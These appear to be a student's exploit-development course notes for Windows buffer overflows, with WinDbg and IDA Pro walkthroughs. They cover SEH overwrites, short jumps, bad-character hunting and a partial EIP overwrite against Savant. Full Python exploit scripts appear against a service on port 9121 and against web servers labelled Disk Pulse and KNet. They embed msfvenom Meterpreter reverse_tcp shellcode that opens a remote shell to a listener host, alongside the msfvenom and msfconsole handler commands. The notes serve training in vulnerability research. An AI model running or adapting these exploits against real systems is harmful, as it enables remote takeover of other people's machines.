.block
{
	.for (r $t0 = 0x58; $t0 < 0x5F; r $t0 = $t0 + 0x01)
	{
		.for (r $t1 = 0x58; $t1 < 0x5F; r $t1 = $t1 + 0x01)
		{
			s-[1]b 10000000 10226000 $t0 $t1 c3
		}
	}
}
```

`u 1015a2f0 L3`

```
libspp!pcre_exec+0x16460:
1015a2f0 58              pop     eax
1015a2f1 5b              pop     ebx
1015a2f2 c3              ret
```

```python
try:
  server = sys.argv[1]
  port = 9121
  size = 1000

  inputBuffer = b"\x41" * 128
  inputBuffer+= pack("<L", (0x1015a2f0))  # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
  inputBuffer+= b"\x43" * (size - len(inputBuffer))
```

`!exchain`

```
018ffe1c: libpal!md5_starts+149fb (0099df5b)
018fff54: libspp!pcre_exec+16460 (1015a2f0)
Invalid exception stack at 41414141
```

`u 1015a2f0 L3`

```
libspp!pcre_exec+0x16460:
1015a2f0 58              pop     eax
1015a2f1 5b              pop     ebx
1015a2f2 c3              ret
```

`bp 0x1015a2f0`

```
t
t
```

`dd poi(esp) L8`

```
018fff54  41414141 1015a2f0 43434343 43434343
018fff64  43434343 43434343 43434343 43434343
```

`t`

After executing the `RET` instruction, we returned into the stack within our controlled buffer right before our `_except_handler` address.

This happens because the `EstablisherFrame` points to the beginning of the `_EXCEPTION_REGISTRATION_RECORD` structure, which starts with the `Next` member followed by the `_except_handler` address.

### Island-Hopping in Assembly

`u eip L8`

```
018fff54 41              inc     ecx
018fff55 41              inc     ecx
018fff56 41              inc     ecx
018fff57 41              inc     ecx
018fff58 f0a215104343    lock mov byte ptr ds:[43431015h],al
018fff5e 43              inc     ebx
018fff5f 43              inc     ebx
018fff60 43              inc     ebx
```

The bytes composing the P/P/R address are translated to a `lock mov byte` instruction when executed as code. This instruction uses part of our buffer as a destination address (`43431015h`) to write the content of the `AL` register.

Because this memory address is not mapped, executing this instruction will trigger another **access violation** and break our exploit.

We can overcome this by using the first 4 bytes of the `Next` structure exception handler (NSEH) to assemble an instruction that will jump over the current SEH and redirect us into our fake shellcode located after the `P/P/R` address. This is known as a "short jump" in assembly.

In assembly, **short jumps** aka **short relative jumps**.

These jump instructions can be relocated anywhere in memory without requiring a change of opcode.

The first opcode of a short jump is always `0xEB` and the second opcode is the **relative offset**, which ranges
- `0x00` - `0x7F` for forward short jumps,
- `0x80` - `0xFF` for backwards short jumps.

After single-stepping through the P/P/R instructions, use the `a` command to assemble the short jump and **obtain its opcodes**:

`dds eip L4`

```
018fff54  41414141
018fff58  1015a2f0 libspp!pcre_exec+0x16460
018fff5c  43434343
018fff60  43434343
```

`a`

```
018fff54 jmp 0x018fff5c
jmp 0x018fff5c
018fff56 
```

`u eip L1`

```
018fff54 eb06            jmp     018fff5c
```

The offset for the jump is 6 bytes rather than 4 (the length of the `P/P/R` address). This is because the offset is calculated from the beginning of the jump instruction, which includes the `0xEB` and the offset itself.

```python
try:
  server = sys.argv[1]
  port = 9121
  size = 1000

  inputBuffer = b"\x41" * 124
  inputBuffer+= pack("<L", (0x06eb9090))  # (NSEH)
  inputBuffer+= pack("<L", (0x1015a2f0))  # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
  inputBuffer+= b"\x43" * (size - len(inputBuffer))
```

Let the debugger continue until it hits our breakpoint `bp 0x1015a2f0`. Next, we'll single-step through the `POP, POP, RET` instructions and reach our short jump:

`r`

```
0132ff54 90              nop
```

`t`

```
0132ff55 90              nop
```

`t`

```
0132ff56 eb06            jmp     0132ff5e
```

`dd eip L30`

```
0132ff56  a2f006eb 43431015 43434343 43434343
0132ff66  43434343 43434343 43434343 43434343
0132ff76  43434343 43434343 43434343 43434343
0132ff86  43434343 43434343 43434343 43434343
0132ff96  43434343 43434343 43434343 43434343
0132ffa6  43434343 43434343 43434343 43434343
0132ffb6  43434343 43434343 43434343 43434343
0132ffc6  43434343 43434343 43434343 43434343
0132ffd6  43434343 ff004343 008d0132 ffff77ed
0132ffe6  6c77ffff 000077f1 00000000 3e100000
0132fff6  7170005b 000000a0 ???????? ????????
01330006  ???????? ???????? ???????? ????????
```

`!teb`

```
TEB at 7ffd8000
    ExceptionList:        0132f34c
    StackBase:            01330000
    StackLimit:           0132e000
```

This amount of space may fit a small shellcode, but we would certainly prefer reverse-shell shellcode in our exploit.

Our PoC sends a large amount of data (1000 bytes), so let's search the stack and see if we can find it.

```python
try:
  server = sys.argv[1]
  port = 9121
  size = 1000

  shellcode = b"\x43" * 400

  inputBuffer = b"\x41" * 124
  inputBuffer+= pack("<L", (0x06eb9090))  # (NSEH)
  inputBuffer+= pack("<L", (0x1015a2f0))  # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
  inputBuffer+= b"\x90" * (size - len(inputBuffer) - len(shellcode))
  inputBuffer+= shellcode
```

Let the debugger continue until it hits our breakpoint `bp 0x1015a2f0`. Next, we'll single-step through the `POP, POP, RET` instructions and reach our short jump:

Running our latest PoC, we can perform a search for the NOP instructions followed by the bytes contained in our shellcode variable right after taking our short jump.

`t`

```
01aeff56 eb06            jmp     01aeff5e
```

`t`

```
01aeff5e 90              nop
```

`!teb`

```
TEB at 00392000
    ExceptionList:        01aef44c
    StackBase:            01af0000
    StackLimit:           01aee000
```

`s -b 01aee000 01af0000 90 90 90 90 43 43 43 43 43 43 43 43`

```
01aefc70  90 90 90 90 43 43 43 43-43 43 43 43 43 43 43 43  ....CCCCCCCCCCCC
```

We found our shellcode on the stack starting from `0x01aefc74`.

Confirm that our shellcode is not truncated in any way.

=> Dumping the full length of the shellcode as DWORDs reveals our entire buffer:

`dd 01aefc70 L65`

```
01aefc70  90909090 43434343 43434343 43434343
01aefc80  43434343 43434343 43434343 43434343
...
01aefdf0  43434343 43434343 43434343 43434343
01aefe00  43434343
```

`? 01aefe00 - 01aefc74`

```
Evaluate expression: 396 = 0000018c
```

Determine the offset from our current stack pointer to the beginning of our shellcode

`? 01aefc74 - @esp`

```
Evaluate expression: 2096 = 00000830
```

To verify the consistency of the offset, we should restart the application and run our exploit multiple times. If possible, we should install the vulnerable application on different machines as well.

If the offset changes slightly each time we launch our exploit, we could introduce a **bigger NOP sled**, placing our shellcode further in our buffer.

Using the limited space available after our short jump, let's assemble a few instructions to increase the stack pointer by `0x830` bytes followed by a `jmp esp` to jump to our shellcode next.

Cannot use an `add esp, 0x830` instruction because it generates null bytes in the opcodes due to the large value:

```bash
msf-nasm_shell 
nasm > add esp, 0x830
00000000  81C430080000      add esp,0x830
```

To avoid null bytes, we could use smaller jumps (of less than `0x7F`) until we reach the desired offset.

Better alternatives: Instead of performing an `ADD` operation on the ESP register, we can reference the `SP` register in our assembly instruction to do arithmetic operations on the lower 16 bits.

Generate the opcodes for this instruction and confirm it does not contain any bad characters.

```bash
nasm > add sp, 0x830
00000000  6681C43008        add sp,0x830

nasm > jmp esp
00000000  FFE4              
```

```python
try:
  server = sys.argv[1]
  port = 9121
  size = 1000

  shellcode = b"\x90" * 8
  shellcode+= b"\x43" * (400 - len(shellcode))

  inputBuffer = b"\x41" * 124
  inputBuffer+= pack("<L", (0x06eb9090))  # (NSEH)
  inputBuffer+= pack("<L", (0x1015a2f0))  # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
  inputBuffer+= b"\x90" * 2
  inputBuffer+= b"\x66\x81\xc4\x30\x08"   # add sp, 0x830
  inputBuffer+= b"\xff\xe4"               # jmp esp
  inputBuffer+= b"\x90" * (size - len(inputBuffer) - len(shellcode))
  inputBuffer+= shellcode
```

`t`

```
01caff5e 6681c43008      add     sp,830h
```

`t`

```
01caff63 ffe4            jmp     esp {01cafc74}
```

`dd @esp L4`

```
01cafc74  90909090 90909090 43434343 43434343
```

`t`

```
01cafc74 90              nop
```

### Obtaining a Shell

Generate a Meterpreter payload (~ 381 bytes)

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.118.5 LPORT=443 -b "\x00\x02\x0A\x0D\xF8\xFD" -f python -v shellcode
```

Metasploit handler was able to catch our reverse meterpreter payload.

```bash
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.119.5; set LPORT 443; exploit"
```

```python
#!/usr/bin/python
import socket
import sys
from struct import pack

try:
  server = sys.argv[1]
  port = 9121
  size = 1000

  # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.118.5 LPORT=443 -b "\x00\x02\x0A\x0D\xF8\xFD" -f python -v shellcode
  shellcode = b"\x90" * 20
  shellcode += b""
  shellcode += b"\xdb\xdd\xb8\xb3\xe9\xc8\x0b\xd9\x74\x24\xf4"
  ...
  shellcode += b"\xb3\x44\x07\x9c\x96"

  inputBuffer = b"\x41" * 124
  inputBuffer+= pack("<L", (0x06eb9090))  # (NSEH)
  inputBuffer+= pack("<L", (0x1015a2f0))  # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
  inputBuffer+= b"\x90" * 2
  inputBuffer+= b"\x66\x81\xc4\x30\x08"   # add sp, 0x830
  inputBuffer+= b"\xff\xe4"               # jmp esp
  inputBuffer+= b"\x90" * (size - len(inputBuffer) - len(shellcode))
  inputBuffer+= shellcode

  header =  b"\x75\x19\xba\xab"
  header += b"\x03\x00\x00\x00"
  header += b"\x00\x40\x00\x00"
  header += pack('<I', len(inputBuffer))
  header += pack('<I', len(inputBuffer))
  header += pack('<I', inputBuffer[-1])

  buf = header + inputBuffer 

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buf)
  s.close()
  
  print("Done!")
  
except socket.error:
  print("Could not connect!")
```

## Extra Mile

### Disk Pulse

`s -b 0 L?80000000 90 90 90 90 44 44 44 44 44 44 44 44`

`dd 01aefc70 L65`

```python
##!/usr/bin/python
import socket, sys
from struct import pack

host = sys.argv[1]
port = 80
size = 6000


def send_exploit_request():


    found_badchars = "\x00\x09\x0a\x0d\x20"

    # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.118.5 LPORT=443 -b "\x00\x09\x0a\x0d\x20" -f python -v shellcode
    shellcode =  b""
    shellcode += b"\xba\xf4\xfa\x3e\x25\xdb\xd0\xd9\x74\x24\xf4"
    ....
    shellcode += b"\x64\x51\x02\x52\x3a\xa1\x07"

    buffer = b"\x90" * 20
    buffer+= shellcode
    buffer+= b"\x41" * (2495 - len(buffer))
    
    buffer+= pack("<L", (0x909006eb))  # (NSEH)
    buffer+= pack("<L", (0x101576c0))  # (SEH) 0x101576c0 - pop eax; pop ebx; ret
    buffer+= b"\x90" * 2
    buffer+= b"\x66\x81\xc4\x8c\x05"  # add sp,0x58C
    buffer+= b"\xff\xe4"
    buffer+= b"\x43" * (size - len(buffer))

    #HTTP Request
    request = b"GET /" + buffer + b"HTTP/1.1" + b"\r\n"
    request += b"Host: " + host.encode() + b"\r\n"
    request += b"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0" + b"\r\n"
    request += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" + b"\r\n"
    request += b"Accept-Language: en-US,en;q=0.5" + b"\r\n"
    request += b"Accept-Encoding: gzip, deflate" + b"\r\n"
    request += b"Connection: keep-alive" + b"\r\n\r\n"
 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.send(request)
    s.close()

if __name__ == "__main__": 

    send_exploit_request()
```

### KNet

```python
#!/usr/bin/python
import socket, sys
from struct import pack

host = sys.argv[1]
port = 80
size = 2000


def send_exploit_request():

    # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.237 LPORT=443 -b "\x00\x0d\x20\x2d\x2e\x2f" -f python -v shellcode
    shellcode =  b""
    shellcode += b"\xd9\xc0\xb8\x39\x86\x35\xad\xd9\x74\x24\xf4"
    ...
    shellcode += b"\xe7\x48\x85\x84\xbb\x8b\x8c"

    buffer = b"\x90" * 20
    buffer+= shellcode
    buffer+= b"\x41" * (1236 - len(buffer))

    # msf-pattern_offset -l 2000 -q 70423370
    buffer+= pack("<L", (0x04eb9090))  # (NSEH)
    buffer+= pack("<L", (0x10016190))  # (SEH) 0x10016190 - pop ebx; pop ebp; ret
    buffer+= b"\x90" * 2
    buffer+= b"\x66\x81\xc4\xfc\x06"  # add sp, 0x6fc 6681C4FC06
    buffer+= b"\xff\xe4"
    buffer+= b"\x43" * (size - len(buffer))

    found_badchars = "\x00\x0d\x20\x2d\x2e\x2f"

    #HTTP Request
    request  = buffer + b" / HTTP/1.0\r\n\r\n"
 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.send(request)
    print(s.recv(1024))
    s.close()

if __name__ == "__main__": 

    send_exploit_request()
```

# IDA Pro

For 32-bit Windows executables and Dynamic Link Libraries (DLLs), select the `Portable executable for 80386`. This is a common denominator for all 32bit x86 processors.

Like WinDbg, IDA Pro can download and use symbols from the Microsoft server while disassembling the binary. This is only natively available if IDA Pro is installed on Windows.

For versions other than IDA Freeware, it's possible to set up a symbols server on a Windows computer with a bundled `Win32_debugger` application.

Options to save IDA Pro database:
- `Pack database`: A file needs to be packed properly to be successfully saved to an `idb` database file, if we don't want to lose our changes.
- `DON'T SAVE the database`: If we do not want to save our changes.

## User Interface

The main disassembly window can show the code organized in three 3 different ways:
-	Graph view
-	Text view
-	Proximity view

The **green and red arrows** originating from a **conditional branch** indicate if the condition was met or not respectively - like if and else in low level languages like C or C++.

**Blue arrows** represent basic block edges, where only one potential successor block is present (JMP assembly instruction).

Reposition the graph while analyzing a selected function by clicking and dragging the background of the `graph` view.

The `text` view presents the entire disassembly listing of a program in a linear fashion. **Control flow** is still indicated by **arrows to the left of the listing**.

Switch between graph view and text view by pressing `Space`.

In the `text` view, **virtual addresses** are displayed for each instruction.

=> Add this for the `graph` view by going to `Options > General` and ticking the `Line prefixes` box.
 
`Proximity` view is for viewing and browsing the relationships between functions, global variables, and constants.

Activate proximity view through `View > Open subviews > Proximity browser`.

The `Functions` window provides a list of all the functions present in the program.
 
Double-clicking an entry in the Functions window will cause IDA Pro to show the start of the selected function directly in the `disassembly` window.

To easily navigate the disassembly of large functions, use the `Graph overview` window to rapidly pan around the function graph.

A dotted outline in the Graph overview indicates which part of the code is currently displayed in the disassembly window.

Navigate to previously viewed basic blocks using the `forward and backward arrows` in the navigation bar at the top left part of the IDA Pro window.
 
To adjust a single window, place the cursor just below the title of the window. When a small bar appears, drag and dock the window next to other windows.
 
Completely reset the UI using `Windows > Reset desktop`.

## Basic Functionality

`Coloring dialog box` - a combination of 2 **colors** can help show desired and undesired paths through basic blocks.

**Comment** on a specific line of assembly code by placing the cursor at a specific line of code and pressing the colon (`:`) key

**Rename a function** by locating it in the `Functions` window, right-clicking it, and selecting `Edit function....` or by pressing the `N` key when the function name is open in the main **assembly window**. This also applies to **global variables**.

Create a **bookmark** by choosing the line we want to bookmark and pressing `Alt + M`

Whenever we need to come back to the same location in the code, pressing `Ctrl + M` will bring up a dialog to select a bookmark. Double-clicking the bookmark name will jump the main disassembly window to the code in question.

## Search Functionality

Search for sequences of bytes, strings, and function names in a target executable or dynamic link library

Search for an **immediate value**, such as a hardcoded DWORD or a specific sequence of bytes, from the `Search` menu or by using `Alt + I` and `Alt + B`, respectively.

Search for **function names** in the `Functions` window or through the `Jump to function` command from the `Jump` menu. In the dialog window, right-click and use `Quick filter` to search for functions

Search for **global variables** through the Jump by name... submenu

All the imported and exported functions are available from the `Imports` and `Exports` tabs respectively. As with the Function window, we can right-click and apply a name filter using the `Quick filter` option to narrow our search.

Use cross referencing (`xref`) to detect all **usages of a specific function or global variable** in the entire executable or DLL.

To obtain the list of cross references for a function name or global variable, select its name from the `graph` view with the mouse cursor and press the `X` key.

## Static-Dynamic Analysis Synchronization

To make sure that the base address of the target executable in IDA Pro coincides with that of the debugged process in WinDbg.

When a Windows executable or DLL file is compiled and linked, the PE header `ImageBase` field defines the preferred base address when loaded into memory.

Often this will not be the address used at runtime, due to other circumstances such as colliding modules or the Address Space Layout Randomization (ASLR) security mitigation.

When the two base addresses do not coincide, the analyzed file can be rebased in IDA Pro to match the address used by the application at runtime.

Dump the base address of Notepad:

`lm m notepad`

```
Browse full module list
start    end        module name
00f20000 00f5f000   notepad    (pdb symbols)  ...
```

Switch back to IDA Pro and navigate to the `Edit > Segments`, enter the new `image base` address.

Once completed, all addresses, references, and global variables will match those found in WinDbg during the debugging session.

If the application contains compiled debug information, rebasing it may sometimes break the symbols.

`u notepad!GotoDlgProc`

```
notepad!GotoDlgProc:
00f279e0 8bff            mov     edi,edi
00f279e2 55              push    ebp
00f279e3 8bec            mov     ebp,esp
```

Press `G` to bring up the `Jump to address` dialog box and enter the absolute address of the function to end up at the same location.

## Tracing Notepad

```bat
echo Test > C:\Tools\doc.txt
```

Open Notepad and attach WinDbg to it.

To perform any read or write actions on Windows, applications must obtain a **handle** to the file, commonly done with the `CreateFileW` function from `kernel32.dll`.

Set a breakpoint on the API and attempt to open the file in Notepad:

```
bp kernel32!CreateFileW
g
```

Turn to IDA Pro, locate `CreateFileW` in the `Imports` tab, and perform a **cross reference**. This provides us with 20 different possibilities.

Let execution continue in the debugger until the end of `CreateFileW`, and return into the calling function:

```
pt
p
```

```
00f25085 8bd8            mov     ebx,eax
```

EAX also contains the handle to the file we'll use later (`eax=00000640`)

We now have an address inside Notepad that we can use with IDA Pro.

After jumping to the address, we find a basic block that sets up arguments and calls `CreateFileW`.

=> Understand what arguments are supplied to the API, since IDA Pro lists their names as comments

Follow the execution flow in IDA Pro and attempt to locate a call to `ReadFile` (within the same function that performed a call to `CreateFileW`).

The instruction `push eax` at address `0xF250A4` is noted by IDA Pro as `lpBuffer`. This is a pointer to the memory buffer that receives the data read from a file.

Continue execution to the call into `ReadFile`:

```
bp f250a6
g
dds esp L5
```

```
007febf8  00000640
007febfc  007fec28
007fec00  00000400
007fec04  007fec20
007fec08  00000000
```

The first argument, is the same file handle returned by `CreateFileW` earlier.

Step over the call to `ReadFile`:

`p`

`da 007fec28`

```
007fec28  "Test ..w."
```

# Overcoming Space Restrictions: Egghunters

## Crashing the Savant Web Server

```python
#!/usr/bin/python
import socket
import sys
from struct import pack

try:
  server = sys.argv[1]
  port = 80
  size = 260

  httpMethod = b"GET /"
  inputBuffer = b"\x41" * size
  httpEndRequest = b"\r\n\r\n"

  buf = httpMethod + inputBuffer +  httpEndRequest

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buf)
  s.close()
  
  print("Done!")
  
except socket.error:
  print("Could not connect!")
```

`dds @esp L5`

```
01b8ea2c  00414141 Savant+0x14141
01b8ea30  01b8ea84
01b8ea34  0041703c Savant+0x1703c
01b8ea38  01805718
01b8ea3c  01805718
```

- We only have 3 bytes available for our shellcode.
- Our buffer is null-byte terminated.

Increasing the size of the buffer by even 1 byte will cause a different crash where we do not gain control over the instruction pointer!

`dds @esp L2`

```
01b8ea2c  00414141 Savant+0x14141
01b8ea30  01b8ea84
```

`dc poi(esp+4)`

```
01b8ea84  00544547 00000000 00000000 00000000  GET.............
01b8ea94  00000000 00000000 4141412f 41414141  ......../AAAAAAA
01b8eaa4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
01b8eab4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
01b8eac4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
```

The 2nd DWORD on the stack points to the **HTTP method**, followed by several null bytes and then our controlled buffer.

## Detecting Bad Characters

```python
...
try:
  server = sys.argv[1]
  port = 80
  size = 260

  badchars = (
    b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c"
    b"\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19"
    b"\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26"
    b"\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33"
    b"\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
    b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d"
    b"\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a"
    b"\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67"
    b"\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74"
    b"\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81"
    b"\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e"
    b"\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b"
    b"\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8"
    b"\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5"
    b"\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2"
    b"\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
    b"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc"
    b"\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9"
    b"\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6"
    b"\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

  httpMethod = b"GET /"
  inputBuffer = badchars
  inputBuffer+= b"\x41" * (size - len(inputBuffer))
  httpEndRequest = b"\r\n\r\n"
...
```

Running the PoC against the vulnerable software does not seem to cause a crash. This is most likely the result of a bad character. 

Comment out the first half of the lines from the badchars variable.

```python
...
try:
  server = sys.argv[1]
  port = 80
  size = 260

  badchars = (
    #b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c"
    #b"\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19"
    #b"\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26"
    #b"\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33"
    #b"\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
    #b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d"
    #b"\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a"
    #b"\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67"
    #b"\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74"
    #b"\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81"
    b"\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e"
    b"\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b"
    b"\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8"
    b"\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5"
    b"\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2"
    b"\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
    b"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc"
    b"\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9"
    b"\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6"
    b"\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
    )

  httpMethod = b"GET /"
  inputBuffer = badchars
  inputBuffer+= b"\x41" * (size - len(inputBuffer))
  httpEndRequest = b"\r\n\r\n"
...
```

Successfully overwrite the instruction pointer.

=> The problematic characters are not present within the last half of the badchars variable, which is not commented out.

Confirm that none of our characters have been mangled in memory:

`db esp - 0n257`

Repeat this process by uncommenting one line at the time.

If the application does not crash, or if we encounter a different crash which does not overwrite the instruction pointer, we can safely assume that the previously uncommented line contains bad characters.

Once we identify the problematic line of characters, send each character from that line individually to the application until we identify the bad characters.

The list of all bad characters: `0x00, 0x0A, 0x0D, 0x25`

## Gaining Code Execution

```bash
msf-pattern_create -l 260
```

```python
...
try:
  server = sys.argv[1]
  port = 80

  httpMethod = b"GET /"
  inputBuffer = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai"
  httpEndRequest = b"\r\n\r\n"
...
```

Running the PoC above sometimes causes a different access violation.

=> Identify the offset by splitting our buffer.

```python
...
try:
  server = sys.argv[1]
  port = 80

  httpMethod = b"GET /"
  inputBuffer = b"\x41" * 130
  inputBuffer+= b"\x42" * 130
  httpEndRequest = b"\r\n\r\n"
...
```

The instruction pointer was overwritten with the `0x42424242` value.

Further split the upper half of our buffer until we are able to accurately pinpoint the exact offset required to overwrite the instruction pointer with our 260-byte buffer.

=> A buffer of `253` bytes required prior to overwriting the instruction pointer.

```python
...
try:
  server = sys.argv[1]
  port = 80
  size = 260

  httpMethod = b"GET /"
  inputBuffer = b"\x41" * 253
  inputBuffer+= b"\x42\x42\x42\x42"
  inputBuffer+= b"\x43" * (size - len(inputBuffer))
  httpEndRequest = b"\r\n\r\n"
...
```

Find a good instruction to overwrite EIP with that will allow us to take control of the execution flow.

To make our exploit as portable as possible, choose a module that comes with the application. The module should not be compiled with any protections.

List the protections of the loaded modules.

`.load narly`

`!nmod`

```
00400000 00452000 Savant    /SafeSEH OFF    C:\Savant\Savant.exe
```

The `Savant.exe` module, compiled without any protections, seems to be mapped at an address that starts with a **null byte**.

## Partial EIP Overwrite

Recall that our buffer is treated as a string => A null byte is added at the end of it.

Only overwrite the lower 3 bytes of the EIP register

```python
...
try:
  server = sys.argv[1]
  port = 80
  size = 253

  httpMethod = b"GET /"
  inputBuffer = b"\x41" * size
  inputBuffer+= b"\x42\x42\x42"
  httpEndRequest = b"\r\n\r\n"

  buf = httpMethod + inputBuffer +  httpEndRequest
...
```

Our partial EIP overwrite was successful (`eip=00424242`).

=> Use an instruction that is present inside the `Savant.exe` module.

What instruction we want to redirect the execution flow to?

One side-effect of our partial instruction pointer overwrite is that we cannot store any data past the return address.

=> Cannot use an instruction like `JMP ESP` because the ESP register will not point to our buffer.

The 2nd DWORD on the stack at the time of the crash points very close to our current stack pointer.

`dds @esp L5`

```
02efea2c  02effe70
02efea30  02efea84
02efea34  0041703c Savant+0x1703c
02efea38  003d56d0
02efea3c  003d56d0
```

`dc poi(@esp+0x04)`

```
02efea84  00544547 00000000 00000000 00000000  GET.............
02efea94  00000000 00000000 4141412f 41414141  ......../AAAAAAA
02efeaa4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
02efeab4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
02efeac4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
02efead4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
02efeae4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
02efeaf4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
```

=> `POP R32; RET`

=> We will have to execute the assembly instructions generated by the GET method opcodes.

`u poi(@esp+0x04)`

```
02efea84 47              inc     edi
02efea85 45              inc     ebp
02efea86 54              push    esp
02efea87 0000            add     byte ptr [eax],al
02efea89 0000            add     byte ptr [eax],al
02efea8b 0000            add     byte ptr [eax],al
02efea8d 0000            add     byte ptr [eax],al
02efea8f 0000            add     byte ptr [eax],al
```

The first three instructions do not seem to affect the execution flow or generate any access violations.

The next instructions, generated by the null bytes after the HTTP method, use the `ADD` operation - the value of the `AL` register is added to the value that `EAX` is pointing to.

These types of instructions can be problematic as they operate on the assumption that `EAX` points to a valid memory address.

=> As part of the `POP` instruction from our sequence, place the DWORD that `ESP` points to into the register of our choice.

Inspect the value that will be popped by the first instruction.

`dds @esp L5`

```
02efea2c  02effe70
02efea30  02efea84
02efea34  0041703c Savant+0x1703c
02efea38  003d56d0
02efea3c  003d56d0
```

`!teb`

```
TEB at 7ffdc000
    ExceptionList:        02efff70
    StackBase:            02f00000
    StackLimit:           02efc000
    SubSystemTib:         00000000
    ...
```

The 1st DWORD on the stack (`02effe70`) points to a memory location that is part of the stack space => a valid memory address.


```bash
msf-nasm_shell
nasm > pop eax
00000000  58                pop eax
nasm > ret
00000000  C3                ret
```

`lm m Savant`

```
Browse full module list
start    end        module name
00400000 00452000   Savant   C (no symbols)
```

`s -[1]b 00400000 00452000 58 c3`

Choose a memory address that points to our instruction sequence and does not contain bad characters `0x00418674`.

```python
...
try:
  server = sys.argv[1]
  port = 80
  size = 253

